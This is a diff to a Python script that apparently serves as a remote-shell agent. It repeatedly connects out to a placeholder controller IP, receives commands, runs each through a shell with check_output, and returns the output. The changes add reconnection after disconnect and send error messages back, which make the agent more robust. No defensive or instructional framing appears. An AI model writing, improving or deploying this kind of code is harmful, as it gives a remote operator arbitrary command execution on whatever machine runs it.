@@ -7,13 +7,13 @@ SELF = socket.gethostbyname(socket.gethostname())
 PORT = 5051
 BUFFER_SIZE = 1024
 FORMAT = "utf-8"
-SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-SOCKET.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-SOCKET.bind((SELF, PORT))
 
 HOST = "ENTER CONTROLLER IP ADDRESS HERE"
 
 while True:
+    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    SOCKET.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    SOCKET.bind((SELF, PORT))
     #standby mode (trying to connect to the controller until successful )
     successful = False
     while not successful:
@@ -28,8 +28,12 @@ while True:
     #active mode (executing commands from the controller)
     while True:
         command = SOCKET.recv(BUFFER_SIZE).decode(FORMAT).split(" ")
-        if command[0] == "HOST_DISCONNECT":
-            break
         print(command)
-        SOCKET.send(check_output(command, shell=True))
+        if command[0] == "HOST_DISCONNECT":
+            SOCKET.close()
+            break
+        try:
+            SOCKET.send(check_output(command, shell=True))
+        except Exception as e:
+            SOCKET.send(bytes(str(e), FORMAT))
 
